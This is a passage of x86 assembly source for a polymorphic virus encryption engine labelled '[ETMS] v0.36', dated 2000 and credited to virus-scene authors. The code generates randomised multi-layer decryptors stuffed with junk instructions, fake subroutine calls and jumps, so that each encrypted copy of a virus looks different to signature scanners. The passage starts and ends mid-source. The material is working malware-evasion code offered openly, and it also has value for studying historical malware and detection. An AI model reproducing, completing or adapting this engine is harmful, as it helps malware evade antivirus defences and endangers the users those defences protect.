;  jackie-, rucker, talena, benny, inty13, uselessa, reptile, dandler, fusys,
;  jhb, slagehammer, giorgetto, tankie, griyo and gf, vecna, belfa, del0,
;  wintermute, spanska, sepultura, cavallo, milla, ^syren^, claire.
;
;                          - live fast, die young -
;                        - written in aug/sept 2000 -
;

engine:
        cld
        push    edi
        push    edi

        call    poly_delta
poly_delta:
        pop     eax                     ; where we are running
        sub     eax,offset poly_delta
        push    ecx
        push    eax

        lea     ebx,[offset v_runnin + eax]

o_vrun  equ     offset v_runnin         ; save some bytes since off between
                                        ; various data is a 8b
        mov     dword ptr [ebx],ebp
        mov     dword ptr [ebx - (o_vrun - offset orig_dx)],edx
        mov     dword ptr [ebx - (o_vrun - offset layer_nr)],tl_space

        xor     ecx,ecx
bit_loop:
        inc     ecx
        shl     ebp,1
        jnc     bit_loop       ; find higher bit with an 1
        dec     ecx            ; for random memory offsets

        mov     byte ptr [ebx - (o_vrun - offset t_memand)],cl
        pop     ebp                             ; delta

how_manylayers:
        call    get_random_al7          ; random number of layers
        cmp     al,6                    ; from 2 to 7
        jae     how_manylayers
        mov     ecx,l_space
        mul     ecx
        mov     dword ptr [ebx - (o_vrun - offset layer_end)],eax

        pop     ecx
start_layer:

o_tini  equ     offset r_pointer
        lea     ebx,[offset r_pointer + ebp]
                                        ; dest, cnt and source
        mov     dword ptr [ebx - (o_tini - offset t_inipnt)],edi
        mov     dword ptr [ebx - (o_tini - offset v_lenght)],ecx
        mov     dword ptr [ebx - (o_tini - offset v_virusp)],esi

        mov     dword ptr [ebx - (o_tini - offset r_pointer)],010ffffffh
        mov     dword ptr [ebx - (o_tini - offset t_chgpnt)],01000404h

        xor     eax,eax
        mov     dword ptr [ebx - (o_tini - offset t_fromend)],eax
        mov     dword ptr [ebx - (o_tini - offset t_pntoff)],eax
        mov     dword ptr [ebx - (o_tini - offset t_cntoff)],eax
        mov     dword ptr [ebx - (o_tini - offset w_loopbg)],eax
        mov     dword ptr [ebx - (o_tini - offset t_inacall)-2],eax
        inc     al
        mov     dword ptr [ebx - (o_tini - offset t_exitjmp)],eax

        push    edi                     ; initialize layer data
        mov     ecx,[ebx - (o_tini - offset layer_nr)]
        lea     edi,[ebx - (o_tini - offset enc_space) + ecx + 10h]
                        ; init layers encryptor, regs struct no needed
        mov     al,90h                  ; virgin encryptor
        mov     dword ptr [ebx - (o_tini - offset w_encrypt)],edi
        mov     ecx,enc_max
        rep     stosb
        pop     edi

        call    rnd_garbage

        mov     ecx,3

        mov     esi,ebx                 ; to memory structures
        mov     edx,dword ptr [esi - (o_tini - offset layer_nr)]
                                 ; edx has offset in the layer structure
init_part:
        push    ecx
select_register:
        call    get_register                    ; get a unused register
        xchg    ebx,ecx

select_block:
        call    get_random_al7
        and     al,011b
        jz      select_block                    ; select from 01 to 03

        dec     eax
        cmp     byte ptr [eax+esi],0ffh         ; check if that stage already
        jne     select_block                    ; done

        mov     byte ptr [eax+esi],bl           ; save the register for that
                                                ; stage
        or      al,al
        jnz     not_pointer

     mov dword ptr [esi - (offset r_pointer - offset enc_space) + edx + 12],edi
                                                ; save offset where the
        jmp     assign_next                     ; pointer is initialized

not_pointer:
        dec     eax
        jnz     not_counter

        mov     dword ptr [esi - (offset r_pointer - offset w_counter)],edi
        jmp     assign_next                     ; assign inital counter

not_counter:

        call    get_random                      ; get key

      mov     dword ptr [esi - (offset r_pointer - offset enc_space) + edx],eax
        xchg    eax,ecx                         ; save key for encryptor

        call    get_random
        and     al,1
        jz      assign_next                     ; if so use key
        mov     byte ptr [esi+2],20h            ; don't use key, just imm
        jmp     next_loop
assign_next:
                ; BL  register
                ; ECX value

; either with mov reg, imm or via stack
        call    get_random
        shr     al,1
        jnc     do_withmov
        mov     al,068h                 ; push immediate
        stosb
        xchg    eax,ecx
        stosd
        call    rnd_garbage
        mov     al,bl
        add     al,058h                 ; pop reg32 base
        stosb
        jmp     next_loop
do_withmov:
        mov     eax,ebx                 ; in bl register
        or      al,0b8h                 ; mov base
        stosb
        xchg    eax,ecx
        stosd                           ; the value

next_loop:
        mov     al,bl
        call    set_used                ; mark as unusable so far

        call    rnd_garbage
        pop     ecx
        loop    init_part               ; make all init steps


; now some base assignment to a pointer, counter and key (if used) registers
; has been done. here we are gonna change a bit the various registers where
; the various things has been assigned
        call    get_random_al7
        and     al,011b                 ; from 0 to 3 moves, could be 0-7 ?
        jz      decryptor_build_start
        xchg    eax,ecx
reg_movida:
        push    ecx
get_whichone:
        call    select_save             ; select which to change (pnt,cnt,key)
        jc      leave_this_out

        call    save_mov_xchg           ; change the regs using mov or xchg
        mov     byte ptr [edx],al
leave_this_out:
        pop     ecx
        loop    reg_movida

decryptor_build_start:
; decryptor loop begins right here

        lea     esi,[offset t_chgpnt + ebp]
        mov     dword ptr [esi - (offset t_chgpnt - offset w_loopbg)],edi

        call    get_random              ; select if starting from head or from
        and     ax,0101h                ; tail and if counter will dec or inc
        mov     word ptr [esi - (offset t_chgpnt - offset t_fromend)],ax

        xchg    eax,edx                 ; rnd in edx

        shl     edx,1                   ; add a constant to counter?
        jnc     normal_counter
        call    get_random
        mov     dword ptr [esi - (offset t_chgpnt - offset t_cntoff)],eax
normal_counter:
        cmp     byte ptr [esi - (offset t_chgpnt - offset r_pointer)],05h
                                        ; no bp + off
        je      reget_size_op

        shl     edx,1                   ; select if use only pointer or
        jc      reget_size_op           ; pointer + offset
        call    get_random              ; select random offset
        mov     dword ptr [esi - (offset t_chgpnt - offset t_pntoff)],eax
                                        ; if using get offset
reget_size_op:
        call    get_random
        mov     edx,eax
        and     eax,0fh                 ; select math operation and size
        or      eax,eax                 ; of operand
        jz      reget_size_op

;      byte  word  dword
; ror   1     6     b
; sub   2     7     c
; xor   3     8     d
; add   4     9     e
; rol   5     a     f
;
no_rorrrpr:
        cmp     byte ptr [esi - (offset t_chgpnt - offset r_regkey)],03
                                        ; if not ax,cx,dx,bx then can't be byte
        jb      can_use_all             ; as key
        cmp     al,6                    ; is byte? get another
        jb      reget_size_op

can_use_all:
        xor     ecx,ecx
        mov     cl,10 ;9
        cmp     byte ptr [esi - (offset t_chgpnt - offset r_regkey)],20h
        je      no_keychanges

        shr     edx,8                   ; edx has rnd
        and     edx,011b
        mov     byte ptr [esi - (offset t_chgpnt - offset t_chgkey)],dl
        add     ecx,edx                 ; add nr of key changes

no_keychanges:
        cmp     al,0bh
        jae     ok_counts
        sub     ecx,4d                  ; if with words 4 inc/dec less
        sub     word ptr [esi],0202h
        cmp     al,06d
        jae     ok_counts
        dec     ecx                     ; for bytes even less
        dec     ecx
        sub     word ptr [esi],0101h

ok_counts:
        push    eax
        call    rnd_garbage
get_nextseq:
        call    get_random_al7
        cmp     al,4
        ja      get_nextseq
        xchg    eax,edx
        cmp     byte ptr [esi+edx],0    ; need more ?
        je      get_nextseq
        dec     byte ptr [esi+edx]
        shl     edx,2                   ; offset = * 4
        sub     edx,(offset t_chgpnt - offset o_table)
        pop     eax
        push    eax
        push    ecx
        push    esi
        mov     ecx,dword ptr [esi+edx]
        add     ecx,ebp
        call    ecx                     ; call the routine to do it
        pop     esi
        pop     ecx
        pop     eax
        loop    ok_counts

; finished decryption loop, needs just the jump backwards
        call    rnd_garbage

        mov     al,0e9h
        stosb
        xor     eax,eax
        xchg    eax,dword ptr [esi - (offset t_chgpnt - offset w_loopbg)]
                                                ; the jump back to start of
        sub     eax,04h                         ; the decryptor and enable
        sub     eax,edi                         ; overwriting on loop :)
        stosd

        call    rnd_garbage
        call    rnd_garbage

        lea     esi,[offset v_lenght + ebp]

        push    edi             ; write the offset of the exit jump
        mov     edx,dword ptr [esi - (offset v_lenght - offset t_chkpos)]
        sub     edi,edx
        mov     dword ptr [edx-4],edi
        pop     edi

; now decryption loop generation is finished
        mov     byte ptr [esi - (offset v_lenght - offset r_used)],10h
                                        ; can use all regs (except ESP) again

        call    rnd_garbage             ; unencrypted one, some more here
        call    rnd_garbage

        push    edi
        call    rnd_garbage                     ; encrypted garbage
        pop     ecx
        neg     ecx
        add     ecx,edi                 ; how much encrypted garbage

        mov     edx,ecx
        sub     edi,edx

        add     ecx,dword ptr [esi]

        shr     ecx,2                   ; so it will be enough for b/w/d enc
        inc     ecx
        shl     ecx,2

        movzx   eax,byte ptr [esi - (offset v_lenght - offset t_prejmp)]
        add     ecx,eax         ; decs before cmp, so we reach equality

        pop     eax
        neg     eax
        add     eax,edi                         ; lenght of decryptor

        add     eax,edx         ; total displacement for this layer
        push    eax             ; so we can correct mem refs
        sub     eax,edx

        add     eax,dword ptr [esi - (offset v_lenght - offset v_runnin)]
                                                ; running offset

        push    esi
        add     esi,dword ptr [esi - (offset v_lenght - offset layer_nr)]
        mov     ebx,dword ptr [esi - (offset v_lenght - offset enc_space) + 12]
        pop     esi
        cmp     byte ptr [esi - (offset v_lenght - offset t_fromend)],00h
        pushf
        je      no_adding
        add     eax,ecx                         ; from end
no_adding:
        sub     eax,dword ptr [esi - (offset v_lenght - offset t_pntoff)]
                                                ; - pointer offset if is there
        mov     dword ptr [ebx+1],eax           ; set initial pointer

        mov     ebx,dword ptr [esi - (offset v_lenght - offset w_counter)]
        inc     ebx

        mov     eax,dword ptr [esi - (offset v_lenght - offset t_cntoff)]
        add     eax,ecx
        mov     dword ptr [ebx],eax

        cmp     byte ptr [esi - (offset v_lenght - offset t_countback)],01h
        je      not_negcnt
        neg     dword ptr [ebx]

not_negcnt:

        mov     ebx,edi                 ; pointer on code to encrypt
        add     edi,edx                 ; + encrypted garbage
        popf
        je      no_adding2
        add     ebx,ecx                 ; add lenght if from end

no_adding2:

; save layer data (cnt and pnt) in its entry
        push    esi
        add     esi,dword ptr [esi - (offset v_lenght - offset layer_nr)]
        mov     dword ptr [esi - (offset v_lenght - offset enc_space) +4],ecx
        mov     dword ptr [esi - (offset v_lenght - offset enc_space) +8],ebx
        pop     esi

        push    esi
        mov     esi,dword ptr [esi - (offset v_lenght - offset v_virusp)]
        push    ecx
        sub     ecx,edx
        rep     movsb                   ; copy what to encrypt
        pop     edx
        pop     esi

        pop     eax                     ; this layer lenght to sum

        mov     ecx,dword ptr [esi - (offset v_lenght - offset layer_nr)]

corr_addr:
        cmp     ecx,tl_space    ; correct the adresses of the lower layers
        je      corr_end
        add     ecx,l_space

        add     [esi - (offset v_lenght - offset enc_space) + ecx + 12d],eax
        add     [esi - (offset v_lenght - offset enc_space) + ecx + 8d],eax

        mov     ebx,[esi - (offset v_lenght - offset enc_space) + ecx + 12d]
        add     dword ptr [ebx + 1],eax         ; pointer from decryptor
        jmp     corr_addr

corr_end:
        mov     ecx,dword ptr [esi - (offset v_lenght - offset layer_end)]

        cmp     dword ptr [esi - (offset v_lenght - offset layer_nr)],ecx
        je      finished_layers

        sub     dword ptr [esi - (offset v_lenght - offset layer_nr)],l_space

        pop     ecx             ; initial EDI
        push    ecx
        push    ecx
        push    ecx
        sub     ecx,edi         ; calculate new lenght to encrypt
        neg     ecx
        pop     edi

        push    ecx
        mov     esi,dword ptr [esi - (offset v_lenght - offset orig_dx)]
        xchg    esi,edi
        mov     edx,edi
        push    esi
        rep     movsb           ; copy to temp space and use that one
        pop     edi             ; as source for next layer
        mov     esi,edx
        pop     ecx
        jmp     start_layer     ; construct next encryption layer

finished_layers:

; now in reverse order
; create each encryption layer
        mov     eax,dword ptr [esi - (offset v_lenght - offset layer_end)]
        sub     esi,(offset v_lenght - (offset enc_space + 10h) - tl_space)
        push    edi
enc_nl:

        mov     ecx,enc_max                     ; the stored regs
        lea     edi,[ebp + offset enc_space_final]
        rep     movsb
        pusha
        lea     edi,[ebp + offset enc_space_final]
__p2:
        cmp     4 ptr [edi-2], 0FFFFD20Bh
        jz      __p1 
        inc     edi
        jmp     __p2
__p1:   mov     al, 74h
        stosb
        stosb
        lea     eax, [ebp+exit_space_final]
        sub     eax, edi
        mov     1 ptr [edi-1], al  
        popa
        mov     ecx, [esi - enc_max - 16]       ; key value
        mov     edx, [esi - enc_max - 12]       ; counter
        mov     ebx, [esi - enc_max - 8]        ; pointer
        sub     esi, (l_space + enc_max)        ; on next layer

; layer chunk, most of it will be overwritten by the one in the structure

enc_max equ     24h
; lenghts
; 6     = max encryption operation
; 4     = max 4 inc/dec counter
; 4     = max 4 inc/dec counter
; 3 * 6 = max 3 * 6 byte key change operations
; 4     = check on edx + jump short

enc_space_final:
        db      enc_max dup (90h)       ; here the encryptor will be placed
        jmp     enc_space_final
exit_space_final:

        add     eax,l_space             ; next layer structure
        cmp     eax,(tl_space + l_space); last layer to do?
        jne     enc_nl

ll_end:
        pop     ecx                     ; the final edi
        pop     edi                     ; calling edi
        sub     ecx,edi                 ; total lenght
        ret                             ; poly finished

; - ETMS return point
poly_name       db      '[ETMS] v0.36 -b0z0/iKX-'

put_encloop_2:
        push    ecx
        xor     ecx,ecx
        inc     ecx
        inc     ecx
        jmp     short put_encloop
put_encloop_1:
        push    ecx
        xor     ecx,ecx
        inc     ecx
put_encloop:
; ecx nr of bytes
        push    eax
        xchg    edi,dword ptr [w_encrypt+ebp]   ; in EDI where we are in enc
                                                ; and save dec position
copy_it:
        stosb
        shr     eax,8
        loop    copy_it
        xchg    dword ptr [w_encrypt+ebp],edi   ; save next and restore dec pnt
        pop     eax
        pop     ecx
        ret

o_table:
o_counter       dd      offset ch_counter
o_pointer       dd      offset ch_pointer
o_key           dd      offset ch_key
o_mate          dd      offset ch_mate
o_exitjmp       dd      offset ch_exitjmp

ch_exitjmp:             ; compare and exit jump for dec loop
        xor     eax,eax
        inc     eax
        mov     ecx,dword ptr [esi - (offset t_chgpnt - offset t_cntoff)]
        or      ecx,ecx
        jnz     must_compare            ; is + a constant ?

get_checker:
        call    get_random
        and     eax,0fh
        cmp     al,09d
        ja      get_checker
must_compare:
        shr     al,1
        pushf
        mov     ah,byte ptr [eax + offset chk_counter + ebp]   ; get comparer
        add     ah,byte ptr [esi - (offset t_chgpnt - offset r_counter)]
        mov     al,81h
        popf
        jc      store_d00
        inc     eax
        inc     eax
        stosw
        xor     al,al
        stosb
        jmp     make_jumps
store_d00:
        stosw
        xchg    eax,ecx
        cmp     byte ptr [esi - (offset t_chgpnt - offset t_countback)],01h
        je      not_negcnt1
        neg     eax
not_negcnt1:
        stosd
make_jumps:
        mov     ax,840fh                ; jz long
        stosw
        stosd
        mov     dword ptr [esi - (offset t_chgpnt - offset t_chkpos)],edi
done_cond:

        xchg    edi,dword ptr [esi - (offset t_chgpnt - offset w_encrypt)]
        mov     ax,0d20bh
        stosw
        mov     al, 0FFh        ; BUG were here
        stosb
        stosb
        xchg    edi,dword ptr [esi - (offset t_chgpnt - offset w_encrypt)]
        ret

ch_counter:                             ; decrement/increment counter
        cmp     byte ptr [esi - (offset t_chgpnt - offset t_exitjmp)],00h
        je      no_pntchgndd
        inc     byte ptr [esi - (offset t_chgpnt - offset t_prejmp)]
no_pntchgndd:
        mov     ah,byte ptr [esi - (offset t_chgpnt - offset r_counter)]
        mov     al,byte ptr [esi - (offset t_chgpnt - offset t_countback)]
        mov     cl,0ah          ; edx + always dec in encryptor
        jmp     mk_incdec

ch_pointer:                             ; increment/decrement pointer
        mov     ah,byte ptr [esi - (offset t_chgpnt - offset r_pointer)]
        mov     al,byte ptr [esi - (offset t_chgpnt - offset t_fromend)]
        mov     cl,03h          ; using ebx in encryptor
;        jmp     mk_incdec

mk_incdec:
; al = 0 means dec, 1 means inc
; ah = register to use
; cl = oring for encryptor
        shl     al,3
        or      al,40h
        or      al,ah
        push    eax
        push    eax             ; will need this one for encryptor
        call    get_random_al7  ; how enc/dec stuff ?
        shr     al,1
        jnc     lbl_hh
        pop     eax
        jmp     set_enc_id_pre  ; do with inc/dec
lbl_hh:
        shr     al,1
        mov     al,083h         ; common prefix
        stosb
        pop     eax
        jc      do_with_sub
; do with add (either +1 or +(-1))
        or      ah,0c0h
        and     al,8h           ; was decrementing ?
        jnz     use_minus1
        jmp     use_plus1

do_with_sub:
        or      ah,0e8h
        and     al,08h          ; was incrementing
        jz      use_minus1

use_plus1:
        xor     al,al           ; 01h
        inc     al
        jmp     set_enc_id_pre2
use_minus1:
        xor     al,al           ; 0ffh
        dec     al
set_enc_id_pre2:
        xchg    ah,al
        stosb
        xchg    ah,al
set_enc_id_pre:
        stosb
set_enc_id:
        pop     eax
        and     al,(NOT 0111b)
        or      al,cl
        jmp     put_encloop_1   ; put in encryptor and go away

ch_key:                                 ; change key register
        cmp     byte ptr [esi - (offset t_chgpnt - offset r_regkey)],20h
        je      exit_keychange
get_modifier:
        call    get_random_al7
        mov     cl,al
        mov     ah,byte ptr [eax + offset key_changers + ebp]
        mov     al,81h          ; add/sub/xor base

        cmp     cl,3
        jb      no_rrrr
        mov     al,0c1h         ; rol/ror base

        cmp     cl,5
        jne     no_rrrr
        mov     al,0f7h

no_rrrr:
        push    eax
reget_ksize:
        call    get_random      ; select if byte/word/dword
        and     al,011b
        jz      reget_ksize
        cmp     cl,05h          ; inc dec just on dw and dd
        jbe     isntincdec
        cmp     al,01h
        je      reget_ksize
isntincdec:
        cmp     byte ptr [esi - (offset t_chgpnt - offset r_regkey)],3
        jbe     canall
        cmp     al,01b          ; byte keychange only for ax,cx,dx,bx
        je      reget_ksize
canall:
        mov     ch,al
        mov     dl,ah           ; random stuff
        pop     eax
        cmp     ch,01h
        jne     no_decbyte
        dec     al
        shr     dl,1
        jc      no_decbyte
        add     ah,04h          ; work on high byte
no_decbyte:
        cmp     ch,02h
        jne     no_wordprefix
        push    eax
        mov     al,66h
        stosb
        call    put_encloop_1
        pop     eax
no_wordprefix:
        cmp     cl,06h
        pushf
        jb      no_incdecch             ; inc/dec has just one byte opcode
        dec     edi
        mov     al,byte ptr [edi]
no_incdecch:
        popf
        push    eax
        jb      no_nopneeded
        mov     al,ah
        or      al,1            ; ecx key in enc loop
        call    put_encloop_1   ; for inc/dec
        jmp     short after_store
no_nopneeded:
        or      ah,1            ; key is ECX in enc loop
        call    put_encloop_2
after_store:
        pop     eax
        or      ah,byte ptr [esi - (offset t_chgpnt - offset r_regkey)]
        stosw
        cmp     cl,05           ; inc/dec/not doesn't need any key
        jae     exit_keychange
        call    get_random
        cmp     cl,03
        jae     just_one_bk     ; ror/rol just one byte key
        cmp     ch,01h
        je      just_one_bk     ; check dimension of key modifier
        stosb
        call    put_encloop_1
        shr     eax,8h
        cmp     ch,02h
        je      just_one_bk
        stosw
        call    put_encloop_2
        shr     eax,10h
just_one_bk:
        stosb
        call    put_encloop_1
exit_keychange:
        ret

ch_mate:                        ; creates the decryption math operation

        xor     edx,edx
        mov     ecx,5h
type_sel:
        cmp     eax,ecx
        jbe     ok_regs
        inc     edx
        sub     eax,ecx
        jmp     type_sel        ; get type and size.. in EDX size, in EAX type
                                ; edx = 0 for byte, 1 for word, 2 for dword

ok_regs:
        cmp     byte ptr [esi - (offset t_chgpnt - offset r_regkey)],20h
        lea     esi,[offset _math_imm + ebp]
        je      without_key
        add     esi,(offset _math_key - offset _math_imm)
without_key:
        dec     eax             ; type - 1
        push    esi
        push    eax
        shl     eax,1           ; each type is a word
        add     esi,eax
        lodsw                   ; ax = mathop word

        cmp     dl,1
        jne     not_word
        push    eax
        mov     al,066h
        stosb
        call    put_encloop_1
        pop     eax
not_word:
        or      dl,dl
        jnz     not_byte
        dec     al
not_byte:
        pop     ebx             ; type - 1
        pop     esi             ;

        push    ebx

        push    eax
        neg     ebx
        add     ebx,4           ; get opposite math operation
        shl     ebx,1
        add     esi,ebx
        lodsw

        lea     esi,[offset r_regkey + ebp]
        cmp     byte ptr [esi],20h
        je      ok_regskey
        cmp     al,0d3h
        je      ok_regskey
        add     ah,08h          ; since ECX is used as key
ok_regskey:
        or      dl,dl
        jnz     not_byterev
        dec     al
not_byterev:
        add     ah,03h          ; in enc loop using EBX
        call    put_encloop_2
        pop     eax

        mov     cl,byte ptr [esi - (offset r_regkey - offset r_pointer)]
        cmp     cl,03h          ; eax-ebx
        ja      upper_ones
        add     ah,cl
        jmp     ok_register_p
upper_ones:
        add     ah,06h
        cmp     cl,06h          ; esi
        je      ok_register_p
        inc     ah
        cmp     cl,07h          ; edi
        je      ok_register_p
        add     ah,03eh         ; ebp
ok_register_p:

        pop     ecx             ; type-1

        cmp     dword ptr [esi - (offset r_regkey - offset t_pntoff)],0
        je      not_plusoff
        add     ah,80h
not_plusoff:
        stosw

        xor     eax,eax

        cmp     byte ptr [esi],20h    ; using key?
        je      ok_register_k

        or      cl,cl
        je      check_rr
        cmp     cl,4
        jne     not_rol_ror
check_rr:
        cmp     byte ptr [esi],1   ; is key CX (cl)
        je      ok_register_k
        mov     al,10h                  ; if not put just immediate
        sub     byte ptr [edi-2],12h

        mov     ebx,dword ptr [esi - (offset r_regkey - offset w_encrypt)]
        sub     byte ptr [ebx-2],12h

        push    ecx
        mov     bl,20h
        xchg    bl,byte ptr [esi]       ; won't use key reg anymore in the
        call    unset_used              ; future, so use for garbage
        pop     ecx
        jmp     short ok_register_k

not_rol_ror:
        mov     al,byte ptr [esi]
        shl     eax,3                   ; * 8
        add     byte ptr [edi-1],al     ; key register

ok_register_k:
        cmp     byte ptr [esi - (offset r_regkey - offset r_pointer)],05h
        jne     not_usingbp
        mov     byte ptr [edi],00h
        inc     edi
not_usingbp:

        mov     eax,dword ptr [esi - (offset r_regkey - offset t_pntoff)]
        or      eax,eax
        jz      no_offsetadd
        stosd
no_offsetadd:
        cmp     byte ptr [esi],20h
        jne     no_key_needed

        push    esi
        add     esi,dword ptr [esi - (offset r_regkey - offset layer_nr)]
        mov     eax,dword ptr [esi - (offset r_regkey - offset enc_space)]
        pop     esi
        or      cl,cl
        je      byte_key
        cmp     cl,4
        je      byte_key
        or      dl,dl
        je      byte_key

        stosb
        call    put_encloop_1

        shr     eax,8
        dec     dl
        jz      byte_key
        stosw
        call    put_encloop_2
        shr     eax,10h
byte_key:
        stosb
        call    put_encloop_1

no_key_needed:
        ret

rnd_garbage:
        push    ecx
        push    eax
        call    get_random
        and     eax,0fh         ; max - 1
        inc     eax             ; not zero
        xchg    eax,ecx

garbager:
; ecx how many
        push    edx
        push    ebx
garbager_loop:
        push    ecx
get_op_type:
        call    get_random      ; how many possible types
        and     eax,garbage_mask
        cmp     eax,garbage_number
        ja      get_op_type

        mov     ecx,[(eax*4)+offset garbage_offsets+ebp]
        add     ecx,ebp
        call    ecx                     ; call garbage routine
        pop     ecx
        loop    garbager_loop

        mov     eax,dword ptr [t_pushed+ebp]

        cmp     eax,000005h     ; if not in a call, not in a jump and
        ja      stack_is_ok     ; pushed <=5

        or      eax,eax
        jz      stack_is_ok

        inc     byte ptr [t_inacall+ebp]

        cmp     al,01h
        ja      direct_addesp
        call    do_pop_nocheck
        jmp     stack_is_ok

direct_addesp:
        push    eax             ; then correct stack
        mov     ax,0c483h       ; add esp,nr_dd * 4
        stosw
        pop     eax
        call    force_popall
stack_is_ok:
        pop     ebx
        pop     edx

        pop     eax
        pop     ecx
        ret

do_push:
        cmp     byte ptr [t_pushed+ebp],05h     ; max dwords on the stack
        ja      exit_pusher
        inc     byte ptr [t_pushed+ebp]
        call    get_random              ; 4 types of pushing
        and     al,011b
        jz      push_register           ; normal push reg
        dec     al
        jz      push_immediate_dd       ; push immediate double
        dec     al
        jz      push_immediate_by       ; push immediate byte

        mov     ax,35ffh                ; push immediate from memory
        stosw
        call    get_address
        jmp     pre_exit_dd

push_immediate_by:
        mov     al,6ah
        stosb
        shr     ah,1
        jc      zero_or_menouno
        bswap   eax
        jmp     pre_exit_pusher

zero_or_menouno:                        ; very usual pushes
        xchg    ah,al
        and     al,01b                  ; so we will get 0 or -1
        dec     al                      ; to LARGE 0 or to LARGE -1
        jmp     pre_exit_pusher

push_immediate_dd:
        mov     al,68h
        stosb
        call    get_random
pre_exit_dd:
        stosd                           ; normal push as double
        jmp     exit_pusher

push_register:
        call    get_random_al7
        add     al,050h
pre_exit_pusher:
        stosb
exit_pusher:
        jmp     exit_ppc

do_pop:
        cmp     byte ptr [t_pushed+ebp],00h
        je      return_nopop
do_pop_nocheck:
        call    get_random
        shr     al,1
        jnc     popintoreg2
        mov     ax,0c483h       ; add esp,
        stosw
get_number:
        call    get_random_al7
        jz      get_number
        cmp     al,byte ptr [t_pushed+ebp]
        ja      get_number
force_popall:
        sub     byte ptr [t_pushed+ebp],al
        shl     al,2            ; dd are pushed, so * 4
        jmp     store_ngo2
popintoreg2:
        call    get_register
        add     cl,058h         ; pop in a register
        xchg    eax,ecx
        dec     byte ptr [t_pushed+ebp]
store_ngo2:
        stosb
return_nopop:
        jmp     exit_ppc

call_subroutines:
        cmp     word ptr [t_maxjmps+ebp],0h      ; don't nest too much nor
        jne     just_exit_call                   ; put pushes/pops in subs and
                                                 ; we can't know wassup in
                                                 ; conditional jumps and such

        inc     byte ptr [t_inacall+ebp]

        call    get_random_al7
        cmp     al,01h          ; 00h and 01h push
        jbe     do_push
        cmp     al,05           ; 02h - 05h pops (more probable so final stack
        jbe     do_pop          ; correction should be needed less often)

        ; 06,07 do a call
        mov     al,0e8h
        stosb
        stosd           ; place for offset

        push    edi
        call    rnd_garbage
        pop     ebx

        mov     al,0e9h
        stosb
        stosd                   ; jump offset
        push    edi
        call    krappo_gen      ; random bytes
        call    rnd_garbage

        push    ebx
        neg     ebx
        add     ebx,edi
        xchg    eax,ebx
        pop     ebx

        mov     dword ptr [ebx-4],eax   ; call offset

        call    rnd_garbage    ; this is the called "subroutine"

        call    get_random      ; more ways of getting back from subroutine,
        shr     al,1            ; either with normal ret or by correcting the
        jnc     normal_ret      ; stack by popping or by adding to esp
        shr     al,1
        jnc     popintoreg
        mov     ax,0c483h       ; add esp,
        stosw
        mov     al,4
        jmp     store_ngo
popintoreg:
        call    get_register
        add     cl,058h         ; pop base
        xchg    eax,ecx
        jmp     store_ngo
normal_ret:
        mov     al,0c3h         ; ret
        stosb
        bswap   eax             ; some random
        and     eax,07h
        cmp     al,4
        jb      do_the_int3s
        jne     no_ccs
random_crap:
        call    krappo_gen
        jmp     no_ccs
do_the_int3s:
        xchg    eax,ecx
        mov     al,0cch         ; int3, usual after subroutines in win32s
        rep     stosb
store_ngo:
        stosb
no_ccs:
        call    rnd_garbage

        pop     ebx             ; jump offset

        push    ebx
        neg     ebx
        add     ebx,edi
        xchg    eax,ebx
        pop     ebx

        mov     dword ptr [ebx-4],eax
exit_ppc:
        dec     byte ptr [t_inacall+ebp]
just_exit_call:
        ret

maths_immediate_short:
        stc
        jmp     maths_immediate_1

maths_immediate:
        clc
maths_immediate_1:
        pushf
        call    get_random      ; (0 to 7) * 8
        and     al,0111000b
        add     al,0c0h        ; the base
        popf
        push    eax
        pushf
        call    get_register
        add     al,cl
        mov     ah,81h          ; prefix
        popf
        pushf
        jnc     not_a_shortone
        inc     ah
        inc     ah
not_a_shortone:
        xchg    ah,al
        stosw
        call    g_dimension
        popf
        jnc     not_a_shortone2
        mov     cl,01h
not_a_shortone2:
        call    put_immediates
        pop     eax
        cmp     al,0f8h         ; is a CMP
        jne     not_compare
make_jmp_after_cmp:
        call    get_random
        and     eax,01b         ; long or short jump
        add     al,06h          ; short jump
        jmp     make_jump
not_compare:
        ret

cdq_jmps_savestack:
        call    get_random_al7
        sub     al,3
        jc      exit_c_j_ss
        xchg    eax,ecx
        mov     al,byte ptr [ecx+offset change_jump+ebp]
        cmp     cl,1
        ja      not_cdq_cbw

        test    byte ptr [r_used+ebp],0101b ; EAX and EDX for cbw,cwd,cdq,cwde
        jnz     exit_c_j_ss
        stosb
        inc     edi
        call    g_dimension
        dec     edi
        jmp     exit_c_j_ss
not_cdq_cbw:
        cmp     cl,4
        je      pushandmov
        add     cl,4                    ; this is used for dimension
        jmp     do_that_fjump           ; do as for conditional ones
pushandmov:

        call    select_save
        jc      exit_c_j_ss

        xchg    eax,ebx
        mov     al,50h                  ; push

        xor     ch,ch                   ; so it won't be erased from stack
        xchg    ch,byte ptr [t_pushed+ebp]

        push    ecx
        call    unset_used              ; mark that as unused one
        add     al,bl                   ; push the reg
        stosb
        call    rnd_garbage
        add     al,08h          ; pop opcode
        stosb

        pop     ebx
        mov     byte ptr [t_pushed+ebp],bh
        mov     byte ptr [r_used+ebp],bl
exit_c_j_ss:
        ret


gen_one_byters:
        call    get_random_al7
make_jump:
        mov     cl,al
        mov     al,byte ptr [eax+offset one_byters+ebp]   ; get onebyter
        cmp     cl,05h
        jbe     not_jump
do_that_fjump:
        cmp     byte ptr [t_maxjmps+ebp],3        ; don't nest too much
        je      just_exit
        inc     byte ptr [t_maxjmps+ebp]

        cmp     al,0e9h                 ; for unconditional ones skip some
        jae     skip_unc                ; things

        cmp     cl,07h
        jne     not_longjump
        push    eax
        mov     al,0fh                  ; long prefix
        stosb
        pop     eax
not_longjump:
        push    eax
        call    get_random
        and     al,0fh
        mov     ch,al
        pop     eax
        add     al,ch
skip_unc:
        stosb                           ; type of jump
        stosb                   ; first off
        cmp     cl,07h
        jne     not_longone
        dec     edi
        stosd
not_longone:
        push    edi
        call    rnd_garbage
        pop     ebx
        mov     eax,edi
        sub     eax,ebx                 ; offset of jump
        dec     byte ptr [t_maxjmps+ebp]
        cmp     cl,7
        je      long_jumper
        cmp     eax,7fh                 ; if not too big then use it
        jb      good_jump
        mov     edi,ebx                 ; else forget everything
        dec     edi
        dec     edi
        ret
good_jump:
        mov     byte ptr [ebx-1],al
        ret
long_jumper:
        mov     dword ptr [ebx-4],eax
        ret
not_jump:
        stosb
just_exit:
        ret

mem_assign:
        mov     ax,058bh
        jmp     mem_common

mem_mathops:
        call    get_random
        and     al,111000b      ; (0 to 7) * 8
        add     al,03h          ; base
mem_common:
        push    eax
        call    get_register
        shl     cl,3            ; *8
        add     cl,05h          ; base for eax
        mov     ah,cl
        stosw
        call    g_dimension

